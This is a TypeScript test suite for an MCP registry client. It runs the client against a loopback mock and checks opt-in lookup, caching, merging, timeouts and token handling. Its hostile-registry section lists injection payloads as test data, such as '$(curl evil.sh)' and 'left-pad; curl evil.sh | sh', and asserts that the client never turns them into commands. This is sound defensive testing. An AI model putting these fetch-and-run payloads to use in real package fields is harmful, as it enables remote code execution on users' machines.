#!/usr/bin/env tsx

/**
 * Continuous Test Suite — MCP Registry remote lookup (#1956)
 *
 * `MCPRegistryClient` used to read only its built-in catalog: `getEntry()` hit
 * a TODO and returned undefined, and the `registries`, `timeout` and
 * `userAgent` settings and `addRegistry()` were stored and never read. This
 * suite drives the client exported from `dist/index.js` against a local mock
 * of the official MCP Registry API (`/v0.1/servers`,
 * `/v0.1/servers/{name}/versions/latest`) and pins the agreed behaviour:
 *
 *   - remote lookup is opt-in: with it off, nothing touches the network
 *   - a `getEntry()` miss resolves from the registry; remote entries are
 *     never `verified`
 *   - `search()` / `getAllEntries()` merge local and remote, local first and
 *     local on an id collision
 *   - timeout, userAgent and authToken are honoured; a bearer token is sent
 *     only over https or to loopback
 *   - client-wide `enableCache: false` wins over a per-registry `true`
 *   - a hostile registry cannot turn its npm identifier or version into a
 *     command, a flag or shell text
 *   - a registry that hangs, errors, returns junk, floods or refuses the
 *     connection degrades to the local result without throwing
 *
 * No AI provider, no credentials, and never the real registry: every request
 * goes to a loopback server this file starts, and `globalThis.fetch` is
 * wrapped so that any other destination fails the test instead of leaving the
 * machine. The one case that needs the official hostname (the default URL)
 * answers it from an in-process stub.
 *
 * Run: pnpm run build && pnpm run test:mcp:registry
 */

import { createServer, type IncomingHttpHeaders } from "node:http";
import type { AddressInfo } from "node:net";
import {
  MCPRegistryClient,
  getAllWellKnownServers,
  getWellKnownServer,
} from "../dist/index.js";
import type {
  MCPRegistryClientConfig,
  McpRegistryEntry,
  RegistryConfig,
} from "../dist/index.js";
import {
  assert,
  assertEqual,
  assertNotNull,
  defineSuite,
} from "./helpers/harness.js";
import { assertDistFresh } from "./helpers/distFreshness.js";

// Fail loudly rather than silently testing a stale build (see distFreshness.ts).
assertDistFresh();

const { test, runSuite } = defineSuite("MCP Registry remote lookup", {
  offline: true,
});

// ---------------------------------------------------------------------------
// Mock registry (the official MCP Registry API, spec 2025-12-01)
// ---------------------------------------------------------------------------

type MockMode =
  | "ok"
  | "hang"
  | "http500"
  | "badjson"
  | "wrongshape"
  | "mismatch"
  | "hostile"
  | "huge";

type SeenRequest = {
  path: string;
  query: URLSearchParams;
  headers: IncomingHttpHeaders;
};

const META_KEY = "io.modelcontextprotocol.registry/official";
const PAGE_SIZE = 2;

const wrap = (server: object, status = "active"): object => ({
  server,
  _meta: {
    [META_KEY]: { status, updatedAt: "2026-10-01T00:00:00Z", isLatest: true },
  },
});

const FOO = wrap({
  name: "io.example/foo",
  description: "Foo remote server",
  version: "2.0.1",
  repository: { url: "https://github.com/example/foo", source: "github" },
  websiteUrl: "https://example.com/foo",
  packages: [
    {
      registryType: "npm",
      identifier: "@example/foo-mcp",
      version: "1.2.0",
      transport: { type: "stdio" },
      environmentVariables: [
        { name: "EXAMPLE_API_KEY", isRequired: true, isSecret: true },
        { name: "EXAMPLE_REGION", isRequired: false },
      ],
    },
  ],
  remotes: [{ type: "streamable-http", url: "https://mcp.example.com/foo" }],
});

const RECORDS: object[] = [
  FOO,
  wrap({
    name: "io.example/bar",
    description: "Bar python server",
    version: "0.3.0",
    packages: [
      {
        registryType: "pypi",
        identifier: "example-bar",
        version: "0.3.0",
        transport: { type: "stdio" },
      },
    ],
    remotes: [{ type: "sse", url: "https://mcp.example.com/bar/sse" }],
  }),
  wrap({
    name: "io.example/baz",
    description: "Baz server",
    version: "1.0.0",
  }),
  wrap(
    {
      name: "io.example/gone",
      description: "Deleted server",
      version: "1.0.0",
    },
    "deleted",
  ),
  wrap(
    {
      name: "io.example/old",
      description: "Deprecated server",
      version: "0.1.0",
    },
    "deprecated",
  ),
  // A record without a name: must be skipped, not poison the page.
  { server: { description: "nameless record" } },
];

// Served only in "hostile" mode: a registry (custom URLs are supported) that
// tries to smuggle an npx flag, shell text or a non-registry spec through the
// npm identifier or version. The first group must never get a command; the
// second group is valid and must still be mapped.
type HostileCase = {
  slug: string;
  identifier: string;
  version?: string;
};

const HOSTILE_CASES: readonly HostileCase[] = [
  { slug: "flag", identifier: "--call=curl evil.sh|sh #", version: "1.0.0" },
  { slug: "dash-flag", identifier: "--package=evil", version: "1.0.0" },
  {
    slug: "shell",
    identifier: "left-pad; curl evil.sh | sh",
    version: "1.0.0",
  },
  { slug: "subshell", identifier: "$(curl evil.sh)", version: "1.0.0" },
  {
    slug: "git-url",
    identifier: "git+https://evil.example/x.git",
    version: "1.0.0",
  },
  { slug: "shorthand", identifier: "someone/repo", version: "1.0.0" },
  { slug: "uppercase", identifier: "Evil-Pkg", version: "1.0.0" },
  { slug: "too-long", identifier: "a".repeat(215), version: "1.0.0" },
  {
    slug: "version-shell",
    identifier: "good-name",
    version: "1.0.0 && curl evil.sh | sh",
  },
  {
    slug: "version-flag",
    identifier: "good-name",
    version: "--call=curl evil.sh|sh",
  },
  {
    slug: "version-newline",
    identifier: "good-name",
    version: "1.0.0\ncurl evil.sh",
  },
];

const HOSTILE_VALID: readonly (HostileCase & { spec: string })[] = [
  {
    slug: "valid-scoped",
    identifier: "@scope/name_x.y~z-1",
    version: "1.0.0-beta.1+build.5",
    spec: "@scope/name_x.y~z-1@1.0.0-beta.1+build.5",
  },
  { slug: "valid-unversioned", identifier: "plain-pkg", spec: "plain-pkg" },
];

const npmPackageJson = (c: HostileCase): object => ({
  registryType: "npm",
  identifier: c.identifier,
  ...(c.version === undefined ? {} : { version: c.version }),
  transport: { type: "stdio" },
  environmentVariables: [{ name: "EVIL_KEY", isRequired: true }],
});

const HOSTILE_RECORDS: object[] = [
  ...[...HOSTILE_CASES, ...HOSTILE_VALID].map((c) =>
    wrap({
      name: `io.evil/${c.slug}`,
      description: `hostile ${c.slug}`,
      version: "1.0.0",
      packages: [npmPackageJson(c)],
    }),
  ),
  // The first npm package is hostile, the second is fine: the fine one wins.
  wrap({
    name: "io.evil/mixed",
    description: "hostile first, valid second",
    version: "1.0.0",
    packages: [
      npmPackageJson({
        slug: "x",
        identifier: "--call=evil",
        version: "1.0.0",
      }),
      npmPackageJson({ slug: "y", identifier: "fine-pkg", version: "2.0.0" }),
    ],
  }),
];

const REMOTE_IDS = [
  "io.example/foo",
  "io.example/bar",
  "io.example/baz",
  "io.example/old",
];

function recordName(record: object): string | undefined {
  const server = (record as { server?: { name?: unknown } }).server;
  return typeof server?.name === "string" ? server.name : undefined;
}

const mock = await (async () => {
  let mode: MockMode = "ok";
  let requests: SeenRequest[] = [];

  const server = createServer((req, res) => {
    const url = new URL(req.url ?? "/", "http://127.0.0.1");
    requests = [
      ...requests,
      { path: req.url ?? "", query: url.searchParams, headers: req.headers },
    ];

    if (mode === "hang") {
      return; // never answer
    }
    if (mode === "http500") {
      res.writeHead(500, { "content-type": "application/json" });
      res.end(JSON.stringify({ error: "boom" }));
      return;
    }
    if (mode === "badjson") {
      res.writeHead(200, { "content-type": "text/html" });
      res.end("<html>this is not json");
      return;
    }
    if (mode === "huge") {
      // Valid JSON, larger than the client's response cap.
      res.writeHead(200, { "content-type": "application/json" });
      res.end(
        Buffer.concat([
          Buffer.from('{"servers":[],"pad":"'),
          Buffer.alloc(9 * 1024 * 1024, 0x61),
          Buffer.from('"}'),
        ]),
      );
      return;
    }

    const records = mode === "hostile" ? HOSTILE_RECORDS : RECORDS;

    res.setHeader("content-type", "application/json");
    const getMatch = /\/v0\.1\/servers\/([^/]+)\/versions\/([^/]+)$/.exec(
      url.pathname,
    );
    if (getMatch) {
      if (mode === "wrongshape") {
        res.end(JSON.stringify({ unexpected: true }));
        return;
      }
      if (mode === "mismatch") {
        res.end(JSON.stringify(FOO));
        return;
      }
      const name = decodeURIComponent(getMatch[1]);
      const found = records.find(
        (r) =>
          recordName(r) === name &&
          (r as { _meta?: Record<string, { status?: string }> })._meta?.[
            META_KEY
          ]?.status !== "deleted",
      );
      if (!found) {
        res.writeHead(404);
        res.end(JSON.stringify({ error: "not found" }));
        return;
      }
      res.end(JSON.stringify(found));
      return;
    }

    if (/\/v0\.1\/servers$/.test(url.pathname)) {
      if (mode === "wrongshape") {
        res.end(JSON.stringify({ servers: "nope" }));
        return;
      }
      const search = url.searchParams.get("search")?.toLowerCase();
      const matching = records.filter((r) => {
        const name = recordName(r);
        return search === undefined || search === null
          ? true
          : name !== undefined && name.toLowerCase().includes(search);
      });
      const pageSize = mode === "hostile" ? records.length : PAGE_SIZE;
      const offset = Number(url.searchParams.get("cursor") ?? "0");
      const slice = matching.slice(offset, offset + pageSize);
      const next = offset + pageSize;
      res.end(
        JSON.stringify({
          servers: slice,
          metadata: {
            ...(next < matching.length ? { nextCursor: String(next) } : {}),
            count: slice.length,
          },
        }),
      );
      return;
    }

    res.writeHead(404);
    res.end(JSON.stringify({ error: "no such route" }));
  });

  await new Promise<void>((resolve) =>
    server.listen(0, "127.0.0.1", () => resolve()),
  );
  const { port } = server.address() as AddressInfo;

  return {
    url: `http://127.0.0.1:${port}`,
    port,
    setMode: (next: MockMode): void => {
      mode = next;
    },
    reset: (): void => {
      mode = "ok";
      requests = [];
    },
    requests: (): readonly SeenRequest[] => requests,
    close: async (): Promise<void> => {
      server.closeAllConnections();
      await new Promise<void>((resolve) => server.close(() => resolve()));
    },
  };
})();

// ---------------------------------------------------------------------------
// Network guard: nothing but the mock may be reached
// ---------------------------------------------------------------------------

const OFFICIAL_HOST = "registry.modelcontextprotocol.io";
const realFetch = globalThis.fetch;
const outbound: string[] = [];
let officialStub:
  | ((url: URL, headers: Record<string, string>) => Response)
  | undefined;

globalThis.fetch = async (
  input: RequestInfo | URL,
  init?: RequestInit,
): Promise<Response> => {
  const url = new URL(
    typeof input === "string" || input instanceof URL ? input : input.url,
  );
  outbound.push(url.toString());
  if (url.hostname === "127.0.0.1") {
    return realFetch(input, init);
  }
  if (url.hostname === OFFICIAL_HOST && officialStub) {
    const headers = init?.headers;
    return officialStub(
      url,
      headers !== undefined &&
        !Array.isArray(headers) &&
        !(headers instanceof Headers)
        ? headers
        : {},
    );
  }
  throw new Error(`blocked outbound request to ${url.hostname}`);
};

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

const WELL_KNOWN_COUNT = getAllWellKnownServers().length;

/**
 * A loopback URL nothing listens on. (Port 1 is not usable: fetch refuses
 * it as a blocked port before connecting, which would test a different error.)
 */
const closedUrl = await (async (): Promise<string> => {
  const probe = createServer();
  await new Promise<void>((resolve) =>
    probe.listen(0, "127.0.0.1", () => resolve()),
  );
  const { port } = probe.address() as AddressInfo;
  await new Promise<void>((resolve) => probe.close(() => resolve()));
  return `http://127.0.0.1:${port}`;
})();

function makeClient(
  registry: Partial<RegistryConfig> = {},
  extra: Partial<MCPRegistryClientConfig> = {},
): MCPRegistryClient {
  return new MCPRegistryClient({
    remoteLookup: true,
    registries: [{ type: "custom", url: mock.url, ...registry }],
    ...extra,
  });
}

function collectErrors(client: MCPRegistryClient): {
  registry: string;
  operation: string;
  message: string;
}[] {
  const errors: { registry: string; operation: string; message: string }[] = [];
  client.on("registryError", (event) => errors.push(event));
  return errors;
}

function resetAll(): void {
  mock.reset();
  outbound.length = 0;
  officialStub = undefined;
}

function idsOf(entries: readonly McpRegistryEntry[]): string[] {
  return entries.map((e) => e.id);
}

async function assertNoThrow<T>(
  what: string,
  fn: () => Promise<T>,
): Promise<T> {
  try {
    return await fn();
  } catch {
    throw new Error(`${what} threw instead of degrading to local results`);
  }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

try {
  await test("opt-in off: no request for a miss, search or getAllEntries", async () => {
    resetAll();
    const clients = [
      new MCPRegistryClient(), // default config: official registry listed
      new MCPRegistryClient({
        registries: [{ type: "custom", url: mock.url }],
      }),
      new MCPRegistryClient({
        remoteLookup: false,
        registries: [{ type: "custom", url: mock.url }],
      }),
    ];
    for (const client of clients) {
      const errors = collectErrors(client);
      assertEqual(
        await client.getEntry("io.example/foo"),
        undefined,
        "a miss must stay a miss when remote lookup is off",
      );
      const all = await client.getAllEntries();
      assertEqual(all.length, WELL_KNOWN_COUNT, "getAllEntries must be local");
      const found = await client.search({ query: "io.example" });
      assertEqual(found.totalCount, 0, "search must be local");
      assertEqual(errors.length, 0, "no registry may be contacted");
    }
    assertEqual(outbound.length, 0, "fetch must not be called at all");
    assertEqual(mock.requests().length, 0, "the mock must see no request");
  });

  await test("getEntry() miss resolves from the registry and maps the record", async () => {
    resetAll();
    const client = makeClient();
    const entry = await client.getEntry("io.example/foo");
    assertNotNull(entry, "the registry entry must resolve");
    assertEqual(entry.id, "io.example/foo", "id");
    assertEqual(entry.name, "io.example/foo", "name");
    assertEqual(entry.description, "Foo remote server", "description");
    assertEqual(entry.version, "2.0.1", "version");
    assertEqual(entry.verified, false, "remote entries are never verified");
    assertEqual(entry.npmPackage, "@example/foo-mcp", "npmPackage");
    assertEqual(entry.command, "npx", "command");
    assertEqual(
      (entry.args ?? []).join(" "),
      "-y @example/foo-mcp@1.2.0",
      "args pin the package version",
    );
    assertEqual(
      (entry.requiredEnvVars ?? []).join(","),
      "EXAMPLE_API_KEY",
      "only required variables are listed",
    );
    assertEqual(
      [...(entry.transports ?? [])].sort().join(","),
      "http,stdio",
      "transports come from the package and the remote",
    );
    assertEqual(entry.homepage, "https://example.com/foo", "homepage");
    assertEqual(
      entry.repository,
      "https://github.com/example/foo",
      "repository",
    );
    assertEqual(
      client.getInstallCommand(entry),
      "npx -y @example/foo-mcp@1.2.0",
    );
    assertEqual(
      client.toServerInfo(entry).metadata?.verified,
      false,
      "toServerInfo must not launder the flag",
    );
    assertEqual(
      client.checkRequiredEnvVars(entry).missing.length,
      process.env.EXAMPLE_API_KEY ? 0 : 1,
      "required env vars are checked",
    );

    // Requests: exactly one, with the name URL-encoded and `latest` as version.
    const seen = mock.requests();
    assertEqual(seen.length, 1, "one request for one lookup");
    assertEqual(
      seen[0].path,
      "/v0.1/servers/io.example%2Ffoo/versions/latest",
      "by-name path",
    );

    // A package that is not npm gets no command, but is still listed.
    const bar = await client.getEntry("io.example/bar");
    assertNotNull(bar, "the pypi-only entry must resolve");
    assertEqual(bar.command, undefined, "no command for a pypi package");
    assertEqual(bar.verified, false, "pypi entry unverified");
    assertEqual(
      JSON.stringify(bar.metadata?.packages),
      JSON.stringify([
        { registryType: "pypi", identifier: "example-bar", version: "0.3.0" },
      ]),
      "pypi package listed in metadata",
    );
  });

  await test("local ids resolve without any request", async () => {
    resetAll();
    const client = makeClient();
    client.addCustomEntry({
      id: "my-internal",
      name: "Internal",
      description: "local",
      version: "1.0.0",
    });
    const wellKnown = await client.getEntry("filesystem");
    assertEqual(wellKnown?.verified, true, "built-in stays verified");
    assertEqual(wellKnown?.id, getWellKnownServer("filesystem")?.id);
    assertEqual((await client.getEntry("my-internal"))?.id, "my-internal");
    assertEqual(mock.requests().length, 0, "no request for local ids");
    assertEqual(outbound.length, 0, "fetch untouched for local ids");
  });

  await test("an unknown id is a plain miss: undefined, no error event", async () => {
    resetAll();
    const client = makeClient();
    const errors = collectErrors(client);
    assertEqual(await client.getEntry("io.example/nope"), undefined);
    assertEqual(
      await client.getEntry("io.example/gone"),
      undefined,
      "a deleted server is a miss",
    );
    assertEqual(errors.length, 0, "a 404 is not an error");
  });

  await test("responses are cached; clearCache() forces a refetch", async () => {
    resetAll();
    const client = makeClient();
    await client.getEntry("io.example/foo");
    await client.getEntry("io.example/foo");
    assertEqual(mock.requests().length, 1, "second lookup is a cache hit");
    client.clearCache();
    await client.getEntry("io.example/foo");
    assertEqual(mock.requests().length, 2, "clearCache must force a refetch");

    const uncached = makeClient({ enableCache: false });
    mock.reset();
    await uncached.getEntry("io.example/foo");
    await uncached.getEntry("io.example/foo");
    assertEqual(mock.requests().length, 2, "per-registry enableCache: false");

    // The merged list follows each registry's own cache settings, not just
    // the client-wide ones.
    mock.reset();
    await uncached.getAllEntries();
    const afterFirst = mock.requests().length;
    await uncached.getAllEntries();
    assertEqual(
      mock.requests().length,
      afterFirst * 2,
      "enableCache: false on a registry also keeps the merged list uncached",
    );

    mock.reset();
    const shortLived = makeClient({ cacheTTL: 300 });
    await shortLived.getAllEntries();
    const listed = mock.requests().length;
    await shortLived.getAllEntries();
    assertEqual(mock.requests().length, listed, "within the registry TTL");
    await new Promise((resolve) => setTimeout(resolve, 450));
    await shortLived.getAllEntries();
    assertEqual(
      mock.requests().length,
      listed * 2,
      "after the registry's cacheTTL the merged list is rebuilt",
    );
  });

  await test("search() and getAllEntries() merge local and remote, local first", async () => {
    resetAll();
    const client = makeClient();
    const result = await client.search({ query: "io.example", limit: 100 });
    const ids = idsOf(result.entries).sort();
    assertEqual(
      ids.join(","),
      [...REMOTE_IDS].sort().join(","),
      "remote entries (deleted and nameless skipped)",
    );
    assert(
      result.entries.every((e) => e.verified === false),
      "every remote entry is unverified",
    );

    // Server-side filtering and pagination: search + version=latest, cursors followed.
    const seen = mock.requests();
    assertEqual(seen[0].query.get("search"), "io.example", "search param");
    assertEqual(seen[0].query.get("version"), "latest", "version param");
    assertEqual(seen[0].query.get("limit"), "100", "limit param");
    assertEqual(
      seen.map((r) => r.query.get("cursor") ?? "-").join(","),
      "-,2,4",
      "follows nextCursor across pages",
    );

    // Without a query the local catalog and the remote servers come together.
    const all = await client.getAllEntries();
    const allIds = idsOf(all);
    assert(allIds.includes("filesystem"), "built-in present");
    assert(
      REMOTE_IDS.every((id) => allIds.includes(id)),
      "remote present",
    );
    assertEqual(
      allIds.length,
      WELL_KNOWN_COUNT + REMOTE_IDS.length,
      "no duplicates",
    );
    const lastLocal = Math.max(
      ...getAllWellKnownServers().map((s) => allIds.indexOf(s.id)),
    );
    const firstRemote = Math.min(...REMOTE_IDS.map((id) => allIds.indexOf(id)));
    assert(lastLocal < firstRemote, "remote entries come after local ones");

    // verifiedOnly can never return a remote entry.
    const verified = await client.search({ verifiedOnly: true, limit: 100 });
    assert(
      verified.entries.length > 0 &&
        verified.entries.every((e) => e.verified === true),
      "verifiedOnly excludes remote entries",
    );
  });

  await test("local entries win an id collision", async () => {
    resetAll();
    const client = makeClient();
    client.addCustomEntry({
      id: "io.example/foo",
      name: "io.example/foo",
      description: "local copy",
      version: "9.9.9",
      verified: true,
    });
    const all = await client.getAllEntries();
    const foos = all.filter((e) => e.id === "io.example/foo");
    assertEqual(foos.length, 1, "one entry per id");
    assertEqual(foos[0].description, "local copy", "custom entry wins");
    const found = await client.search({ query: "io.example", limit: 100 });
    assertEqual(
      found.entries.filter((e) => e.id === "io.example/foo")[0].description,
      "local copy",
      "custom entry wins in search too",
    );
    mock.reset();
    assertEqual(
      (await client.getEntry("io.example/foo"))?.description,
      "local copy",
      "getEntry prefers the custom entry",
    );
    assertEqual(mock.requests().length, 0, "and makes no request");
  });

  await test("maxPages caps how much of a registry is merged", async () => {
    resetAll();
    const client = makeClient({ maxPages: 1 });
    const result = await client.search({ query: "io.example", limit: 100 });
    assertEqual(
      idsOf(result.entries).sort().join(","),
      "io.example/bar,io.example/foo",
      "only the first page",
    );
    assertEqual(mock.requests().length, 1, "one page requested");
  });

  await test("userAgent is sent; the default applies when unset", async () => {
    resetAll();
    await makeClient({}, { userAgent: "NeuroLink-Registry-Test/7" }).getEntry(
      "io.example/foo",
    );
    assertEqual(
      mock.requests()[0].headers["user-agent"],
      "NeuroLink-Registry-Test/7",
      "configured userAgent",
    );
    mock.reset();
    await makeClient().getEntry("io.example/foo");
    assertEqual(
      mock.requests()[0].headers["user-agent"],
      "NeuroLink-MCP-Registry-Client/1.0",
      "default userAgent",
    );
    assertEqual(mock.requests()[0].headers.accept, "application/json");
  });

  await test("authToken is sent as a bearer to that registry and never emitted", async () => {
    resetAll();
    const token = "tok-9f3a1c-registry-secret";
    const client = makeClient({ authToken: token });
    const events: unknown[] = [];
    client.on("registryAdded", (e) => events.push(e));
    client.addRegistry({
      type: "custom",
      url: `${mock.url}/other`,
      authToken: token,
    });
    await client.getEntry("io.example/nope");
    const authValues = mock.requests().map((r) => r.headers.authorization);
    assert(
      authValues.length === 2 &&
        authValues.every((v) => v === `Bearer ${token}`),
      "bearer header on every request to a registry that has a token",
    );
    assert(
      !JSON.stringify(events).includes(token),
      "registryAdded must not carry the token",
    );

    mock.reset();
    await makeClient().getEntry("io.example/foo");
    assertEqual(
      mock.requests()[0].headers.authorization,
      undefined,
      "no Authorization header without a token",
    );

    // Failure events must not leak it either.
    mock.setMode("http500");
    const failing = makeClient({ authToken: token });
    const errors = collectErrors(failing);
    await failing.getEntry("io.example/foo");
    assert(errors.length === 1, "failure reported once");
    assert(
      !JSON.stringify(errors).includes(token),
      "registryError must not carry the token",
    );
  });

  await test("URL forms: trailing slash, /v0.1 suffix and a path prefix", async () => {
    resetAll();
    for (const url of [
      `${mock.url}/`,
      `${mock.url}/v0.1`,
      `${mock.url}/v0.1/`,
    ]) {
      mock.reset();
      const entry = await makeClient({ url }).getEntry("io.example/foo");
      assertEqual(entry?.id, "io.example/foo", "resolves");
      assertEqual(
        mock.requests()[0].path,
        "/v0.1/servers/io.example%2Ffoo/versions/latest",
      );
    }
    mock.reset();
    await makeClient({ url: `${mock.url}/registry/` }).getEntry(
      "io.example/foo",
    );
    assertEqual(
      mock.requests()[0].path,
      "/registry/v0.1/servers/io.example%2Ffoo/versions/latest",
      "path prefix kept",
    );
  });

  await test("registries the client cannot query are skipped without a request", async () => {
    resetAll();
    const client = new MCPRegistryClient({
      remoteLookup: true,
      registries: [
        { type: "npm", url: mock.url },
        { type: "github", url: mock.url },
        { type: "custom" },
        { type: "custom", url: "ftp://127.0.0.1/registry" },
        { type: "custom", url: "not a url" },
        { type: "custom", url: `http://user:pw@127.0.0.1:${mock.port}` },
      ],
    });
    const errors = collectErrors(client);
    assertEqual(await client.getEntry("io.example/foo"), undefined);
    assertEqual((await client.getAllEntries()).length, WELL_KNOWN_COUNT);
    assertEqual(outbound.length, 0, "nothing was attempted");
    assertEqual(errors.length, 0, "skipping is not an error");
  });

  await test("official registry default URL and addRegistry() are honoured", async () => {
    resetAll();
    const official: string[] = [];
    officialStub = (url) => {
      official.push(url.toString());
      return new Response(JSON.stringify({ error: "not found" }), {
        status: 404,
        headers: { "content-type": "application/json" },
      });
    };

    const client = new MCPRegistryClient({ remoteLookup: true });
    assertEqual(await client.getEntry("io.example/foo"), undefined);
    await client.search({ query: "io.example" });
    assert(
      official[0] ===
        "https://registry.modelcontextprotocol.io/v0.1/servers/io.example%2Ffoo/versions/latest",
      "default registry is the official one, by-name endpoint",
    );
    assert(
      official[1].startsWith(
        "https://registry.modelcontextprotocol.io/v0.1/servers?",
      ) && official[1].includes("search=io.example"),
      "list endpoint",
    );
    assertEqual(mock.requests().length, 0, "the mock was not involved");

    // addRegistry() was stored and never read before: now it is queried.
    const second = new MCPRegistryClient({
      remoteLookup: true,
      registries: [],
    });
    second.addRegistry({ type: "custom", url: mock.url });
    assertEqual(
      (await second.getEntry("io.example/foo"))?.id,
      "io.example/foo",
    );

    // Runtime opt-in on a client built with the defaults.
    mock.reset();
    outbound.length = 0;
    const toggled = new MCPRegistryClient({
      registries: [{ type: "custom", url: mock.url }],
    });
    await toggled.getEntry("io.example/foo");
    assertEqual(outbound.length, 0, "off until enabled");
    toggled.setRemoteLookup(true);
    assertEqual(
      (await toggled.getEntry("io.example/foo"))?.id,
      "io.example/foo",
    );
    toggled.setRemoteLookup(false);
    mock.reset();
    toggled.clearCache();
    assertEqual(await toggled.getEntry("io.example/foo"), undefined);
    assertEqual(mock.requests().length, 0, "off again");
  });

  await test("a registry that hangs is cut off by the timeout and degrades to local", async () => {
    resetAll();
    mock.setMode("hang");

    const perRegistry = makeClient({ timeout: 150 }, { timeout: 60_000 });
    const errors = collectErrors(perRegistry);
    let started = Date.now();
    assertEqual(
      await assertNoThrow("getEntry", () =>
        perRegistry.getEntry("io.example/foo"),
      ),
      undefined,
    );
    assert(Date.now() - started < 5_000, "registry timeout bounds getEntry");
    const result = await assertNoThrow("search", () =>
      perRegistry.search({ query: "io.example" }),
    );
    assertEqual(result.totalCount, 0, "search degrades to local results");
    assertEqual(
      (await perRegistry.getAllEntries()).length,
      WELL_KNOWN_COUNT,
      "getAllEntries degrades to the local catalog",
    );
    assert(errors.length >= 2, "failures are reported as registryError events");
    assertEqual(errors[0].operation, "getEntry");

    // Client-wide timeout applies when the registry sets none.
    const clientWide = makeClient({}, { timeout: 150 });
    started = Date.now();
    assertEqual(await clientWide.getEntry("io.example/foo"), undefined);
    assert(Date.now() - started < 5_000, "client timeout bounds getEntry");

    // Local results survive intact.
    const local = await perRegistry.search({ query: "filesystem" });
    assert(
      idsOf(local.entries).includes("filesystem"),
      "local entries still searchable while the registry hangs",
    );
  });

  await test("HTTP errors, junk bodies and refused connections degrade without throwing", async () => {
    resetAll();
    for (const mode of [
      "http500",
      "badjson",
      "wrongshape",
      "mismatch",
    ] as const) {
      mock.reset();
      mock.setMode(mode);
      const client = makeClient();
      const errors = collectErrors(client);
      assertEqual(
        await assertNoThrow(`getEntry (${mode})`, () =>
          client.getEntry("io.example/bar"),
        ),
        undefined,
        `getEntry must degrade (${mode})`,
      );
      // "mismatch" only corrupts the by-name endpoint; the list is fine.
      if (mode !== "mismatch") {
        const all = await assertNoThrow(`getAllEntries (${mode})`, () =>
          client.getAllEntries(),
        );
        assertEqual(
          all.length,
          WELL_KNOWN_COUNT,
          `getAllEntries must be local-only (${mode})`,
        );
      }
      assert(errors.length >= 1, `failure reported (${mode})`);
    }

    const refused = new MCPRegistryClient({
      remoteLookup: true,
      registries: [{ type: "custom", url: closedUrl, timeout: 2000 }],
    });
    const refusedErrors = collectErrors(refused);
    assertEqual(
      await assertNoThrow("getEntry (refused)", () =>
        refused.getEntry("io.example/foo"),
      ),
      undefined,
    );
    assertEqual((await refused.search({})).totalCount, WELL_KNOWN_COUNT);
    assert(refusedErrors.length >= 1, "refused connection reported");
    assert(
      refusedErrors[0].message.includes("ECONNREFUSED"),
      "the connection error code is kept in the event",
    );

    // A listener that throws must not turn a degraded lookup into an error.
    mock.setMode("http500");
    const noisy = makeClient();
    noisy.on("registryError", () => {
      throw new Error("listener failure");
    });
    assertEqual(
      await assertNoThrow("getEntry (throwing listener)", () =>
        noisy.getEntry("io.example/foo"),
      ),
      undefined,
    );
  });

  await test("one failing registry does not hide another; failures are not cached", async () => {
    resetAll();
    const client = new MCPRegistryClient({
      remoteLookup: true,
      registries: [
        { type: "custom", url: closedUrl, timeout: 1000 },
        { type: "custom", url: mock.url },
      ],
    });
    const errors = collectErrors(client);
    assertEqual(
      (await client.getEntry("io.example/foo"))?.id,
      "io.example/foo",
      "the working registry still answers",
    );
    const merged = await client.getAllEntries();
    assert(
      REMOTE_IDS.every((id) => idsOf(merged).includes(id)),
      "working registry's servers are merged",
    );
    assert(errors.length >= 1, "the broken one is reported");

    // A registry that failed once and recovers is picked up without clearCache().
    resetAll();
    const flaky = makeClient();
    mock.setMode("http500");
    assertEqual((await flaky.getAllEntries()).length, WELL_KNOWN_COUNT);
    assertEqual(await flaky.getEntry("io.example/foo"), undefined);
    mock.setMode("ok");
    assertEqual(
      (await flaky.getAllEntries()).length,
      WELL_KNOWN_COUNT + REMOTE_IDS.length,
      "a failed merge must not be cached for the whole TTL",
    );
    assertEqual(
      (await flaky.getEntry("io.example/foo"))?.id,
      "io.example/foo",
      "a failed lookup must not be cached either",
    );
  });

  await test("a hostile registry cannot turn an npm identifier or version into a command", async () => {
    resetAll();
    mock.setMode("hostile");
    const client = makeClient({ maxPages: 50 });

    // By-name path.
    for (const c of HOSTILE_CASES) {
      const entry = await client.getEntry(`io.evil/${c.slug}`);
      assertNotNull(entry, `${c.slug}: the record still resolves`);
      assertEqual(entry.verified, false, `${c.slug}: unverified`);
      assertEqual(entry.command, undefined, `${c.slug}: no command`);
      assertEqual(entry.args, undefined, `${c.slug}: no args`);
      assertEqual(entry.npmPackage, undefined, `${c.slug}: no npmPackage`);
      assertEqual(entry.installCommand, undefined, `${c.slug}: no install`);
      assertEqual(entry.requiredEnvVars, undefined, `${c.slug}: no env vars`);
      assertEqual(
        client.getInstallCommand(entry),
        undefined,
        `${c.slug}: nothing to copy and paste`,
      );
      const info = client.toServerInfo(entry);
      assertEqual(
        info.command,
        undefined,
        `${c.slug}: no MCPServerInfo command`,
      );
      assertEqual(info.args, undefined, `${c.slug}: no MCPServerInfo args`);
      assertEqual(
        JSON.stringify(entry.metadata?.packages),
        JSON.stringify([
          {
            registryType: "npm",
            identifier: c.identifier,
            ...(c.version === undefined ? {} : { version: c.version }),
          },
        ]),
        `${c.slug}: the package is still listed as data`,
      );
    }

    // Valid names and versions still map, so the check is not a blanket no.
    for (const c of HOSTILE_VALID) {
      const entry = await client.getEntry(`io.evil/${c.slug}`);
      assertNotNull(entry, `${c.slug}: resolves`);
      assertEqual(entry.command, "npx", `${c.slug}: command`);
      assertEqual(
        (entry.args ?? []).join(" "),
        `-y ${c.spec}`,
        `${c.slug}: args`,
      );
      assertEqual(
        entry.installCommand,
        `npx -y ${c.spec}`,
        `${c.slug}: install`,
      );
      assertEqual(entry.npmPackage, c.identifier, `${c.slug}: npmPackage`);
      assertEqual(
        (entry.requiredEnvVars ?? []).join(","),
        "EVIL_KEY",
        `${c.slug}: env vars of the runnable package`,
      );
    }
    const mixed = await client.getEntry("io.evil/mixed");
    assertEqual(
      (mixed?.args ?? []).join(" "),
      "-y fine-pkg@2.0.0",
      "a valid npm package after a hostile one is used",
    );

    // List path: same mapper, same result.
    const runnable = (await client.getAllEntries())
      .filter((e) => e.id.startsWith("io.evil/") && e.command !== undefined)
      .map((e) => e.id)
      .sort();
    assertEqual(
      runnable.join(","),
      ["io.evil/mixed", ...HOSTILE_VALID.map((c) => `io.evil/${c.slug}`)]
        .sort()
        .join(","),
      "only the valid records are runnable in a listing",
    );
  });

